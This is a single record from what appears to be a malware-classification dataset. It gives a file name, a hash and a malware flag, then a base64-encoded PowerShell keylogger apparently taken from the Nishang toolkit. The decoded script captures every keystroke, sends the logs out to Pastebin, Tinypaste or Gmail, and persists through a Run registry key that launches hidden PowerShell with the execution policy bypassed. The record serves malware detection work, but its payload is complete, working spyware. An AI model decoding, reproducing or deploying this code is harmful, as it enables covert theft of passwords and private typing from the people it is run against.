Keylogger.ps1,5ade6e84b404cefcf1807292187b477b,Scan result is 32768. IsMalware: 1,PCMKLlNZTk9QU0lTCk5pc2hhbmcgUGF5bG9hZCB3aGljaCBsb2dzIGtleXMuCgouREVTQ1JJUFRJT04KVGhpcyBwYXlsb2FkIGxvZ3MgYSB1c2VyJ3Mga2V5cyBhbmQgd3JpdGVzIHRoZW0gdG8gZmlsZSBrZXkubG9nIChJIGtub3cgaXRzIGJhZCA6fCkgaW4gdXNlcidzIHRlbXAgZGlyZWN0b3J5LgpUaGUga2V5cyBhcmUgdGhhbiBwYXN0ZWQgdG8gcGFzdGViaW58dGlueXBhc3RlfGdtYWlsfGFsbCBhcyBwZXIgc2VsZWN0aW9uLiBTYXZlZCBrZXlzIGNvdWxkIHRoZW4gYmUgZGVjb2RlZAp1c2luZyB0aGUgUGFyc2VfS2V5IHNjcmlwdCBpbiBuaXNoYW5nLgoKLlBBUkFNRVRFUiBwZXJzaXN0ClVzZSB0aGlzIHBhcmFtZXRlciB0byBhY2hpZXZlIHJlYm9vdCBwZXJzaXN0ZW5jZS4gRGlmZmVyZW50IG1ldGhvZHMgb2YgcGVyc2lzdGVuY2Ugd2l0aCBBZG1pbiBhY2Nlc3MgYW5kIG5vcm1hbCB1c2VyIGFjY2Vzcy4KCi5QQVJBTUVURVIgZGV2X2tleQpUaGUgVW5pcXVlIEFQSSBrZXkgcHJvdmlkZWQgYnkgcGFzdGViaW4gd2hlbiB5b3UgcmVnaXN0ZXIgYSBmcmVlIGFjY291bnQuClVudXNlZCBmb3IgdGlueXBhc3RlLgpVbnVzZWQgZm9yIGdtYWlsIG9wdGlvbi4KCi5QQVJBTUVURVIgdXNlcm5hbWUKVXNlcm5hbWUgZm9yIHRoZSBwYXN0ZWJpbiBhY2NvdW50IHdoZXJlIGRhdGEgd291bGQgYmUgcGFzdGVkLgpVc2VybmFtZSBmb3IgdGhlIHRpbnlwYXN0ZSBhY2NvdW50IHdoZXJlIGRhdGEgd291bGQgYmUgcGFzdGVkLgpVc2VybmFtZSBmb3IgdGhlIGdtYWlsIGFjY291bnQgd2hlcmUgYXR0YWNobWVudCB3b3VsZCBiZSBzZW50IGFzIGFuIGF0dGFjaG1lbnQuCgouUEFSQU1FVEVSIHBhc3N3b3JkClBhc3N3b3JkIGZvciB0aGUgcGFzdGViaW4gYWNjb3VudCB3aGVyZSBkYXRhIHdvdWxkIGJlIHBhc3RlZC4KUGFzc3dvcmQgZm9yIHRoZSB0aW55cGFzdGUgYWNjb3VudCB3aGVyZSBkYXRhIHdvdWxkIGJlIHBhc3RlZC4KUGFzc3dvcmQgZm9yIHRoZSBnbWFpbCBhY2NvdW50IHdoZXJlIGRhdGEgd291bGQgYmUgc2VudC4KCi5QQVJBTUVURVIga2V5b3V0b3B0aW9uClRoZSBtZXRob2QgeW91IHdhbnQgdG8gdXNlIGZvciBleGZpdHJhdGlvbiBvZiBkYXRhLgoiMCIgZm9yIGRpc3BsYXlpbmcgb24gY29uc29sZQoiMSIgZm9yIHBhc3RlYmluLgoiMiIgZm9yIGdtYWlsCiIzIiBmb3IgdGlueXBhc3RlICAgCgouUEFSQU1FVEVSIE1hZ2ljU3RyaW5nClRoZSBzdHJpbmcgd2hpY2ggd2hlbiBmb3VuZCBhdCBDaGVja1VSTCB3aWxsIHN0b3AgdGhlIGtleWxvZ2dlci4KCi5QQVJBTUVURVIgQ2hlY2tVUkwKVGhlIFVSTCB3aGljaCB3b3VsZCBjb250YWluIHRoZSBNYWdpY1N0cmluZyB1c2VkIHRvIHN0b3Aga2V5bG9nZ2luZy4KCi5FWEFNUExFClBTID4gLlxLZXlsb2dnZXIucHMxClRoZSBwYXlsb2FkIHdpbGwgYXNrIGZvciBhbGwgcmVxdWlyZWQgb3B0aW9ucy4KCi5FWEFNUExFClBTID4gLlxLZXlsb2dnZXIucHMxIGh0dHA6Ly9leGFtcGxlLmNvbSBzdG9wdGhpcwpVc2UgYWJvdmUgd2hlbiB1c2luZyB0aGUgcGF5bG9hZCBmcm9tIG5vbi1pbnRlcmFjdGl2ZSBzaGVsbHMgYW5kIG5vIGV4ZmlsdHJhdGlvbiBpcyByZXF1aXJlZC4KCi5FWEFNUExFClBTID4gLlxLZXlsb2dnZXIucHMxIGh0dHA6Ly9leGFtcGxlLmNvbSBzdG9wdGhpcyAtZXhmaWwgPGRldl9rZXk+IDx1c2VybmFtZT4gPHBhc3M+IDMgClVzZSBhYm92ZSB3aGVuIHVzaW5nIHRoZSBwYXlsb2FkIGZyb20gbm9uLWludGVyYWN0aXZlIHNoZWxscyBvciB5b3UgZG9uJ3Qgd2FudCB0aGUgcGF5bG9hZCB0byBhc2sgZm9yIGFueSBvcHRpb25zLgoKCi5FWEFNUExFClBTID4gLlxLZXlsb2dnZXIucHMxIC1wZXJzaXN0CgpVc2UgYWJvdmUgZm9yIHJlYm9vdCBwZXJzaXN0ZW5jZS4KCi5MSU5LCmh0dHA6Ly9sYWJvZmFwZW5ldHJhdGlvbnRlc3Rlci5ibG9nc3BvdC5jb20vCmh0dHA6Ly9jb2RlLmdvb2dsZS5jb20vcC9uaXNoYW5nCiM+CgpbQ21kbGV0QmluZGluZyhEZWZhdWx0UGFyYW1ldGVyU2V0TmFtZT0ibm9leGZpbCIpXQpQYXJhbSggW1BhcmFtZXRlcigpXSBbU3dpdGNoXSAkcGVyc2lzdCwKW1BhcmFtZXRlcihQYXJhbWV0ZXJzZXRuYW1lPSJleGZpbCIpXSBbU3dpdGNoXSAkZXhmaWwsCltQYXJhbWV0ZXIoUG9zaXRpb24gPSAwLCBNYW5kYXRvcnkgPSAkVHJ1ZSwgUGFyYW1ldGVyc2V0bmFtZT0iZXhmaWwiKV0gW1BhcmFtZXRlcihQb3NpdGlvbiA9IDAsIE1hbmRhdG9yeSA9ICRUcnVlLCBQYXJhbWV0ZXJzZXRuYW1lPSJub2V4ZmlsIildIFtTdHJpbmddJENoZWNrVVJMLApbUGFyYW1ldGVyKFBvc2l0aW9uID0gMSwgTWFuZGF0b3J5ID0gJFRydWUsIFBhcmFtZXRlcnNldG5hbWU9ImV4ZmlsIildIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAxLCBNYW5kYXRvcnkgPSAkVHJ1ZSwgUGFyYW1ldGVyc2V0bmFtZT0ibm9leGZpbCIpXSBbU3RyaW5nXSRNYWdpY1N0cmluZywKW1BhcmFtZXRlcihQb3NpdGlvbiA9IDIsIE1hbmRhdG9yeSA9ICRUcnVlLCBQYXJhbWV0ZXJzZXRuYW1lPSJleGZpbCIpXSBbU3RyaW5nXSRkZXZfa2V5LApbUGFyYW1ldGVyKFBvc2l0aW9uID0gMywgTWFuZGF0b3J5ID0gJFRydWUsIFBhcmFtZXRlcnNldG5hbWU9ImV4ZmlsIildIFtTdHJpbmddJHVzZXJuYW1lLApbUGFyYW1ldGVyKFBvc2l0aW9uID0gNCwgTWFuZGF0b3J5ID0gJFRydWUsIFBhcmFtZXRlcnNldG5hbWU9ImV4ZmlsIildIFtTdHJpbmddJHBhc3N3b3JkLApbUGFyYW1ldGVyKFBvc2l0aW9uID0gNSwgTWFuZGF0b3J5ID0gJFRydWUsIFBhcmFtZXRlcnNldG5hbWU9ImV4ZmlsIildIFtTdHJpbmddJGtleW91dG9wdGlvbiApCgoKCiRmdW5jdGlvbnMgPSAgewoKZnVuY3Rpb24gS2V5bG9nZ2VyCnsKICAgIFBhcmFtICggW1BhcmFtZXRlcihQb3NpdGlvbiA9IDAsIE1hbmRhdG9yeSA9ICRUcnVlKV0gW1N0cmluZ10kTWFnaWNTdHJpbmcsCiAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMSwgTWFuZGF0b3J5ID0gJFRydWUpXSBbU3RyaW5nXSRDaGVja1VSTCkKICAgIAogICAgJHNpZ25hdHVyZSA9IEAiIAogICAgW0RsbEltcG9ydCgidXNlcjMyLmRsbCIsIENoYXJTZXQ9Q2hhclNldC5BdXRvLCBFeGFjdFNwZWxsaW5nPXRydWUpXSAKICAgIHB1YmxpYyBzdGF0aWMgZXh0ZXJuIHNob3J0IEdldEFzeW5jS2V5U3RhdGUoaW50IHZpcnR1YWxLZXlDb2RlKTsgCiJAIAogICAgJGdldEtleVN0YXRlID0gQWRkLVR5cGUgLW1lbWJlckRlZmluaXRpb24gJHNpZ25hdHVyZSAtbmFtZSAiTmV3dHlwZSIgLW5hbWVzcGFjZSBuZXduYW1lc3BhY2UgLXBhc3NUaHJ1IAogICAgJGNoZWNrID0gMAogICAgd2hpbGUgKCR0cnVlKSAKICAgIHsgCiAgICAgICAgU3RhcnQtU2xlZXAgLU1pbGxpc2Vjb25kcyA0MCAKICAgICAgICAkbG9nZ2VkID0gIiIgCiAgICAgICAgJHJlc3VsdD0iIiAKICAgICAgICAkc2hpZnRfc3RhdGU9IiIgCiAgICAgICAgJGNhcHNfc3RhdGU9IiIgCiAgICAgICAgZm9yICgkY2hhcj0xOyRjaGFyIC1sZSAyNTQ7JGNoYXIrKykgCiAgICAgICAgeyAKICAgICAgICAgICAgJHZrZXkgPSAkY2hhciAKICAgICAgICAgICAgJGxvZ2dlZCA9ICRnZXRLZXlTdGF0ZTo6R2V0QXN5bmNLZXlTdGF0ZSgkdmtleSkgCiAgICAgICAgICAgIGlmICgkbG9nZ2VkIC1lcSAtMzI3NjcpIAogICAgICAgICAgICB7IAogICAgICAgICAgICAgICAgaWYoKCR2a2V5IC1nZSA0OCkgLWFuZCAoJHZrZXkgLWxlIDU3KSkgCiAgICAgICAgICAgICAgICB7IAogICAgICAgICAgICAgICAgICAgICRsZWZ0X3NoaWZ0X3N0YXRlID0gJGdldEtleVN0YXRlOjpHZXRBc3luY0tleVN0YXRlKDE2MCkgCiAgICAgICAgICAgICAgICAgICAgJHJpZ2h0X3NoaWZ0X3N0YXRlID0gJGdldEtleVN0YXRlOjpHZXRBc3luY0tleVN0YXRlKDE2MSkgCiAgICAgICAgICAgICAgICAgICAgICAgIGlmKCgkbGVmdF9zaGlmdF9zdGF0ZSAtZXEgLTMyNzY4KSAtb3IgKCRyaWdodF9zaGlmdF9zdGF0ZSAtZXEgLTMyNzY4KSkgCiAgICAgICAgICAgICAgICAgICAgICAgIHsgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkcmVzdWx0ID0gIlMtIiArICR2a2V5IAogICAgICAgICAgICAgICAgICAgICAgICB9IAogICAgICAgICAgICAgICAgICAgICAgICBlbHNlIAogICAgICAgICAgICAgICAgICAgICAgICB7IAogICAgICAgICAgICAgICAgICAgICAgICAgICAgJHJlc3VsdCA9ICR2a2V5IAogICAgICAgICAgICAgICAgICAgICAgICB9IAogICAgICAgICAgICAgICAgICAgIH0gCiAgICAgICAgICAgICAgICBlbHNlaWYoKCR2a2V5IC1nZSA2NCkgLWFuZCAoJHZrZXkgLWxlIDkwKSkgCiAgICAgICAgICAgICAgICB7IAogICAgICAgICAgICAgICAgICAgICRsZWZ0X3NoaWZ0X3N0YXRlID0gJGdldEtleVN0YXRlOjpHZXRBc3luY0tleVN0YXRlKDE2MCkgCiAgICAgICAgICAgICAgICAgICAgJHJpZ2h0X3NoaWZ0X3N0YXRlID0gJGdldEtleVN0YXRlOjpHZXRBc3luY0tleVN0YXRlKDE2MSkgCiAgICAgICAgICAgICAgICAgICAgJGNhcHNfc3RhdGUgPSBbY29uc29sZV06OkNhcHNMb2NrIAogICAgICAgICAgICAgICAgICAgIGlmKCEoKCRsZWZ0X3NoaWZ0X3N0YXRlIC1lcSAtMzI3NjgpIC1vciAoJHJpZ2h0X3NoaWZ0X3N0YXRlIC1lcSAtMzI3NjgpKSAteG9yICRjYXBzX3N0YXRlKSAKICAgICAgICAgICAgICAgICAgICB7IAogICAgICAgICAgICAgICAgICAgICAgICAkcmVzdWx0ID0gIlMtIiArICR2a2V5IAogICAgICAgICAgICAgICAgICAgIH0gCiAgICAgICAgICAgICAgICAgICAgZWxzZSAKICAgICAgICAgICAgICAgICAgICB7IAogICAgICAgICAgICAgICAgICAgICAgICAkcmVzdWx0ID0gJHZrZXkgCiAgICAgICAgICAgICAgICAgICAgfSAKICAgICAgICAgICAgICAgIH0gCiAgICAgICAgICAgICAgICBlbHNlaWYoKCgkdmtleSAtZ2UgMTg2KSAtYW5kICgkdmtleSAtbGUgMTkyKSkgLW9yICgoJHZrZXkgLWdlIDIxOSkgLWFuZCAoJHZrZXkgLWxlIDIyMikpKSAKICAgICAgICAgICAgICAgIHsgCiAgICAgICAgICAgICAgICAgICAgJGxlZnRfc2hpZnRfc3RhdGUgPSAkZ2V0S2V5U3RhdGU6OkdldEFzeW5jS2V5U3RhdGUoMTYwKSAKICAgICAgICAgICAgICAgICAgICAkcmlnaHRfc2hpZnRfc3RhdGUgPSAkZ2V0S2V5U3RhdGU6OkdldEFzeW5jS2V5U3RhdGUoMTYxKSAKICAgICAgICAgICAgICAgICAgICBpZigoJGxlZnRfc2hpZnRfc3RhdGUgLWVxIC0zMjc2OCkgLW9yICgkcmlnaHRfc2hpZnRfc3RhdGUgLWVxIC0zMjc2OCkpIAogICAgICAgICAgICAgICAgICAgIHsgCiAgICAgICAgICAgICAgICAgICAgICAgICRyZXN1bHQgPSAiUy0iICsgJHZrZXkgCiAgICAgICAgICAgICAgICAgICAgfSAKICAgICAgICAgICAgICAgICAgICBlbHNlIAogICAgICAgICAgICAgICAgICAgIHsgCiAgICAgICAgICAgICAgICAgICAgICAkcmVzdWx0ID0gJHZrZXkgCiAgICAgICAgICAgICAgICAgICAgfSAKICAgICAgICAgICAgICAgIH0gCiAgICAgICAgICAgICAgICBlbHNlIAogICAgICAgICAgICAgICAgeyAKICAgICAgICAgICAgICAgICAgICAkcmVzdWx0ID0gJHZrZXkgCiAgICAgICAgICAgICAgICB9IAogICAgICAgICAgICAgICAgJG5vdyA9IEdldC1EYXRlOyAKICAgICAgICAgICAgICAgICRsb2dMaW5lID0gIiRyZXN1bHQgIiAKICAgICAgICAgICAgICAgICRmaWxlbmFtZSA9ICIkZW52OnRlbXBca2V5LmxvZyIgCiAgICAgICAgICAgICAgICBPdXQtRmlsZSAtRmlsZVBhdGggJGZpbGVOYW1lIC1BcHBlbmQgLUlucHV0T2JqZWN0ICIkbG9nTGluZSIgCgogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgICRjaGVjaysrCiAgICAgICAgaWYgKCRjaGVjayAtZXEgNjAwMCkKICAgICAgICB7CiAgICAgICAgICAgICR3ZWJjbGllbnQgPSBOZXctT2JqZWN0IFN5c3RlbS5OZXQuV2ViQ2xpZW50CiAgICAgICAgICAgICRmaWxlY29udGVudCA9ICR3ZWJjbGllbnQuRG93bmxvYWRTdHJpbmcoIiRDaGVja1VSTCIpCiAgICAgICAgICAgIGlmICgkZmlsZWNvbnRlbnQgLWVxICRNYWdpY1N0cmluZykKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgYnJlYWsKICAgICAgICAgICAgfQogICAgICAgICAgICAkY2hlY2sgPSAwCiAgICAgICAgfQogICAgfQp9CgpmdW5jdGlvbiBLZXlwYXN0ZQp7CiAgICBQYXJhbSAoIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAwLCBNYW5kYXRvcnkgPSAkVHJ1ZSldIFtTdHJpbmddICRrZXlvdXRvcHRpb24sCiAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMSwgTWFuZGF0b3J5ID0gJFRydWUpXSBbU3RyaW5nXSAkZGV2X2tleSwKICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAyLCBNYW5kYXRvcnkgPSAkVHJ1ZSldIFtTdHJpbmddJHVzZXJuYW1lLAogICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDMsIE1hbmRhdG9yeSA9ICRUcnVlKV0gW1N0cmluZ10kcGFzc3dvcmQsCiAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gNCwgTWFuZGF0b3J5ID0gJFRydWUpXSBbU3RyaW5nXSRNYWdpY1N0cmluZywKICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSA1LCBNYW5kYXRvcnkgPSAkVHJ1ZSldIFtTdHJpbmddJENoZWNrVVJMKQogICAgJGNoZWNrID0gMAogICAgd2hpbGUoJHRydWUpIAogICAgeyAKICAgICAgICAkcmVhZCA9IDAKICAgICAgICBTdGFydC1TbGVlcCAtU2Vjb25kcyA1IAogICAgICAgICRwYXN0ZXZhbHVlPUdldC1Db250ZW50ICRlbnY6dGVtcFxrZXkubG9nIAogICAgICAgICRyZWFkKysKICAgICAgICBpZiAoJHJlYWQgLWVxIDMwKQogICAgICAgIHsKICAgICAgICAgICAgT3V0LUZpbGUgLUZpbGVQYXRoICRlbnY6dGVtcFxrZXkubG9nIC1Gb3JjZSAtSW5wdXRPYmplY3QgIiAiIAogICAgICAgICAgICAkcmVhZCA9IDAKICAgICAgICB9CiAgICAgICAgJG5vdyA9IEdldC1EYXRlOyAKICAgICAgICAkbmFtZSA9ICRlbnY6Q09NUFVURVJOQU1FIAogICAgICAgICRwYXN0ZV9uYW1lID0gJG5hbWUgKyAiIDogIiArICRub3cuVG9Vbml2ZXJzYWxUaW1lKCkuVG9TdHJpbmcoImRkL01NL3l5eXkgSEg6bW06c3M6ZmZmIikKICAgICAgICBGdW5jdGlvbiBQb3N0X2h0dHAoJHVybCwkcGFyYW1ldGVycykgCiAgICAgICAgeyAKICAgICAgICAgICAgJGh0dHBfcmVxdWVzdCA9IE5ldy1PYmplY3QgLUNvbU9iamVjdCBNc3htbDIuWE1MSFRUUCAKICAgICAgICAgICAgJGh0dHBfcmVxdWVzdC5vcGVuKCJQT1NUIiwgJHVybCwgJGZhbHNlKSAKICAgICAgICAgICAgJGh0dHBfcmVxdWVzdC5zZXRSZXF1ZXN0SGVhZGVyKCJDb250ZW50LXR5cGUiLCJhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQiKSAKICAgICAgICAgICAgJGh0dHBfcmVxdWVzdC5zZXRSZXF1ZXN0SGVhZGVyKCJDb250ZW50LWxlbmd0aCIsICRwYXJhbWV0ZXJzLmxlbmd0aCk7IAogICAgICAgICAgICAkaHR0cF9yZXF1ZXN0LnNldFJlcXVlc3RIZWFkZXIoIkNvbm5lY3Rpb24iLCAiY2xvc2UiKSAKICAgICAgICAgICAgJGh0dHBfcmVxdWVzdC5zZW5kKCRwYXJhbWV0ZXJzKSAKICAgICAgICAgICAgJHNjcmlwdDpzZXNzaW9uX2tleT0kaHR0cF9yZXF1ZXN0LnJlc3BvbnNlVGV4dCAKICAgICAgICAgICAgJHNlc3Npb25fa2V5IAogICAgICAgIH0gCgogICAgICAgIGZ1bmN0aW9uIEdldC1NRDUoKQogICAgICAgIHsKICAgICAgICAgICAgI2h0dHA6Ly9zdGFja292ZXJmbG93LmNvbS9xdWVzdGlvbnMvMTA1MjEwNjEvaG93LXRvLWdldC1hLW1kNS1jaGVja3N1bS1pbi1wb3dlcnNoZWxsCiAgICAgICAgICAgICRtZDUgPSBuZXctb2JqZWN0IC1UeXBlTmFtZSBTeXN0ZW0uU2VjdXJpdHkuQ3J5cHRvZ3JhcGh5Lk1ENUNyeXB0b1NlcnZpY2VQcm92aWRlcgogICAgICAgICAgICAkdXRmOCA9IG5ldy1vYmplY3QgLVR5cGVOYW1lIFN5c3RlbS5UZXh0LlVURjhFbmNvZGluZwogICAgICAgICAgICAkaGFzaCA9IFtTeXN0ZW0uQml0Q29udmVydGVyXTo6VG9TdHJpbmcoJG1kNS5Db21wdXRlSGFzaCgkdXRmOC5HZXRCeXRlcygkcGFzc3dvcmQpKSkuUmVwbGFjZSgiLSIsICIiKS5Ub0xvd2VyKCkKICAgICAgICAgICAgcmV0dXJuICRoYXNoCiAgICAgICAgfQoKICAgICAgICBpZiAoJGtleW91dG9wdGlvbiAtZXEgIjEiKQogICAgICAgIHsKICAgICAgICAgICAgUG9zdF9odHRwICJodHRwOi8vcGFzdGViaW4uY29tL2FwaS9hcGlfbG9naW4ucGhwIiAiYXBpX2Rldl9rZXk9JGRldl9rZXkmYXBpX3VzZXJfbmFtZT0kdXNlcm5hbWUmYXBpX3VzZXJfcGFzc3dvcmQ9JHBhc3N3b3JkIiAKICAgICAgICAgICAgUG9zdF9odHRwICJodHRwOi8vcGFzdGViaW4uY29tL2FwaS9hcGlfcG9zdC5waHAiICJhcGlfdXNlcl9rZXk9JHNlc3Npb25fa2V5JmFwaV9vcHRpb249cGFzdGUmYXBpX2Rldl9rZXk9JGRldl9rZXkmYXBpX3Bhc3RlX25hbWU9JHBhc3RlX25hbWUmYXBpX3Bhc3RlX2NvZGU9JHBhc3RldmFsdWUmYXBpX3Bhc3RlX3ByaXZhdGU9MiIgCiAgICAgICAgfQogICAgICAgIAogICAgICAgIGVsc2VpZiAoJGtleW91dG9wdGlvbiAtZXEgIjIiKQogICAgICAgIHsKICAgICAgICAgICAgI2h0dHA6Ly9zdGFja292ZXJmbG93LmNvbS9xdWVzdGlvbnMvMTI1MjMzNS9zZW5kLW1haWwtdmlhLWdtYWlsLXdpdGgtcG93ZXJzaGVsbC12MnMtc2VuZC1tYWlsbWVzc2FnZQogICAgICAgICAgICAjQ29kZSBmb3IgYXR0YWNoZW1lbnQgaXMgY29tbWVudGVkIG91dC4gVGhlIGZpbGUgbG9jayBpcyBub3QgYmVpbmcgcmVsZWFzZSBldmVuIGFmdGVyIHVzaW5nIERpc3Bvc2UoKQogICAgICAgICAgICAjVGhhdCBjb2RlIGlzIGxlZnQgaW50ZW50aW9uYWxseSBzbyB0aGF0IGEgdXNlciBtYXkgdHJ5L2ZpeCBpdC4KCiAgICAgICAgICAgICMkZmlsZW5hbWUgPSAiJGVudjpURU1QXGtleS5sb2ciCiAgICAgICAgICAgICRzbXRwc2VydmVyID0g4oCcc210cC5nbWFpbC5jb23igJ0KICAgICAgICAgICAgJG1zZyA9IG5ldy1vYmplY3QgTmV0Lk1haWwuTWFpbE1lc3NhZ2UKICAgICAgICAgICAgIyRhdHQgPSBuZXctb2JqZWN0IE5ldC5NYWlsLkF0dGFjaG1lbnQoJGZpbGVuYW1lKQogICAgICAgICAgICAkc210cCA9IG5ldy1vYmplY3QgTmV0Lk1haWwuU210cENsaWVudCgkc210cFNlcnZlciApCiAgICAgICAgICAgICRzbXRwLkVuYWJsZVNzbCA9ICRUcnVlCiAgICAgICAgICAgICRzbXRwLkNyZWRlbnRpYWxzID0gTmV3LU9iamVjdCBTeXN0ZW0uTmV0Lk5ldHdvcmtDcmVkZW50aWFsKOKAnCR1c2VybmFtZeKAnSwg4oCcJHBhc3N3b3Jk4oCdKTsgCiAgICAgICAgICAgICRtc2cuRnJvbSA9IOKAnCR1c2VybmFtZUBnbWFpbC5jb23igJ0KICAgICAgICAgICAgJG1zZy5Uby5BZGQo4oCdJHVzZXJuYW1lQGdtYWlsLmNvbeKAnSkKICAgICAgICAgICAgJG1zZy5TdWJqZWN0ID0gJHBhc3RlX25hbWUKICAgICAgICAgICAgJG1zZy5Cb2R5ID0gJHBhc3RldmFsdWUKICAgICAgICAgICAgIyRtc2cuQXR0YWNobWVudHMuQWRkKCRhdHQpCiAgICAgICAgICAgICRzbXRwLlNlbmQoJG1zZykgICAgIAogICAgICAgICAgICAjJGF0dC5EaXNwb3NlKCkgICAgICAKICAgICAgICB9CgogICAgICAgIGVsc2VpZiAoJGtleW91dG9wdGlvbiAtZXEgIjMiKQogICAgICAgIHsKICAgICAgICAgICAgCiAgICAgICAgICAgICRoYXNoID0gR2V0LU1ENQogICAgICAgICAgICBQb3N0X2h0dHAgImh0dHA6Ly90bnkuY3ovYXBpL2NyZWF0ZS54bWwiICJwYXN0ZT0kcGFzdGV2YWx1ZSZ0aXRsZT0kcGFzdGVfbmFtZSZpc19jb2RlPTAmaXNfcHJpdmF0ZT0xJnBhc3N3b3JkPSRkZXZfa2V5JmF1dGhlbnRpY2F0ZT0kdXNlcm5hbWVgOiRoYXNoIgogICAgICAgIH0KCiAgICAgICAgJGNoZWNrKysKICAgICAgICBpZiAoJGNoZWNrIC1lcSA2MDAwKQogICAgICAgIHsKICAgICAgICAgICAgJHdlYmNsaWVudCA9IE5ldy1PYmplY3QgU3lzdGVtLk5ldC5XZWJDbGllbnQKICAgICAgICAgICAgJGZpbGVjb250ZW50ID0gJHdlYmNsaWVudC5Eb3dubG9hZFN0cmluZygiJENoZWNrVVJMIikKICAgICAgICAgICAgaWYgKCRmaWxlY29udGVudCAtZXEgJE1hZ2ljU3RyaW5nKQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBicmVhawogICAgICAgICAgICB9CiAgICAgICAgfQogICAgfQp9Cn0KCgoKICAgICRtb2R1bGVuYW1lID0gJHNjcmlwdDpNeUludm9jYXRpb24uTXlDb21tYW5kLk5hbWUKICAgIGlmKCRwZXJzaXN0IC1lcSAkVHJ1ZSkKICAgIHsKICAgICAgICAkbmFtZSA9ICJwZXJzaXN0LnZicyIgCiAgICAgICAgJG9wdGlvbnMgPSAic3RhcnQtam9iIC1Jbml0aWFsaXphdGlvblNjcmlwdCBgJGZ1bmN0aW9ucyAtc2NyaXB0YmxvY2sge0tleXBhc3RlICRhcmdzWzBdICRhcmdzWzFdICRhcmdzWzJdICRhcmdzWzNdICRhcmdzWzRdICRhcmdzWzVdfSAtQXJndW1lbnRMaXN0IEAoJGtleW91dG9wdGlvbiwkZGV2X2tleSwkdXNlcm5hbWUsJHBhc3N3b3JkLCRNYWdpY1N0cmluZywkQ2hlY2tVUkwpIgogICAgICAgICRvcHRpb25zMiA9ICJzdGFydC1qb2IgLUluaXRpYWxpemF0aW9uU2NyaXB0IGAkZnVuY3Rpb25zIC1zY3JpcHRibG9jayB7S2V5bG9nZ2VyICRhcmdzWzBdICRhcmdzWzFdfSAtQXJndW1lbnRMaXN0IEAoJE1hZ2ljU3RyaW5nLCRDaGVja1VSTCkiCiAgICAgICAgJGZ1bmMgPSAkZnVuY3Rpb25zLlRvc3RyaW5nKCkKICAgICAgICBPdXQtRmlsZSAtSW5wdXRPYmplY3QgJyRmdW5jdGlvbnMgPSAgeycgLUZvcmNlICRlbnY6VEVNUFwkbW9kdWxlbmFtZQogICAgICAgIE91dC1GaWxlIC1JbnB1dE9iamVjdCAkZnVuYyAtQXBwZW5kICRlbnY6VEVNUFwkbW9kdWxlbmFtZQogICAgICAgIE91dC1GaWxlIC1JbnB1dE9iamVjdCAnfScgLUFwcGVuZCAtTm9DbG9iYmVyICRlbnY6VEVNUFwkbW9kdWxlbmFtZQogICAgICAgIE91dC1GaWxlIC1JbnB1dE9iamVjdCAkb3B0aW9ucyAtQXBwZW5kIC1Ob0Nsb2JiZXIgJGVudjpURU1QXCRtb2R1bGVuYW1lCiAgICAgICAgT3V0LUZpbGUgLUlucHV0T2JqZWN0ICRvcHRpb25zMiAtQXBwZW5kIC1Ob0Nsb2JiZXIgJGVudjpURU1QXCRtb2R1bGVuYW1lCiAgICAgICAgICAgCiAgICAgICAgTmV3LUl0ZW1Qcm9wZXJ0eSAtUGF0aCBIS0NVOlNvZnR3YXJlXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFJ1blwgLU5hbWUgVXBkYXRlIC1Qcm9wZXJ0eVR5cGUgU3RyaW5nIC1WYWx1ZSAkZW52OlRFTVBcJG5hbWUgLWZvcmNlCiAgICAgICAgZWNobyAiU2V0IG9ialNoZWxsID0gQ3JlYXRlT2JqZWN0KGAiV3NjcmlwdC5zaGVsbGAiKSIgPiAkZW52OlRFTVBcJG5hbWUKICAgICAgICBlY2hvICJvYmpTaGVsbC5ydW4oYCJwb3dlcnNoZWxsIC1ub2V4aXQgLVdpbmRvd1N0eWxlIEhpZGRlbiAtZXhlY3V0aW9ucG9saWN5IGJ5cGFzcyAtZmlsZSAkZW52OnRlbXBcJG1vZHVsZW5hbWVgIikiID4+ICRlbnY6VEVNUFwkbmFtZQoKICAgIH0gIAoKICAgIGVsc2UKICAgIHsKICAgICAgICBpZiAoJGV4ZmlsIC1lcSAkVHJ1ZSkKICAgICAgICB7CiAgICAgICAgICAgIHN0YXJ0LWpvYiAtSW5pdGlhbGl6YXRpb25TY3JpcHQgJGZ1bmN0aW9ucyAtc2NyaXB0YmxvY2sge0tleXBhc3RlICRhcmdzWzBdICRhcmdzWzFdICRhcmdzWzJdICRhcmdzWzNdICRhcmdzWzRdICRhcmdzWzVdfSAtQXJndW1lbnRMaXN0IEAoJGtleW91dG9wdGlvbiwkZGV2X2tleSwkdXNlcm5hbWUsJHBhc3N3b3JkLCRNYWdpY1N0cmluZywkQ2hlY2tVUkwpCiAgICAgICAgICAgIHN0YXJ0LWpvYiAtSW5pdGlhbGl6YXRpb25TY3JpcHQgJGZ1bmN0aW9ucyAtc2NyaXB0YmxvY2sge0tleWxvZ2dlciAkYXJnc1swXSAkYXJnc1sxXX0gLUFyZ3VtZW50TGlzdCBAKCRNYWdpY1N0cmluZywkQ2hlY2tVUkwpCiAgICAgICAgfQogICAgICAgIGVsc2UKICAgICAgICB7CiAgICAgICAgICAgIEtleWxvZ2dlciAkTWFnaWNTdHJpbmcgJENoZWNrVVJMCiAgICAgICAgfQogICAgfQo=
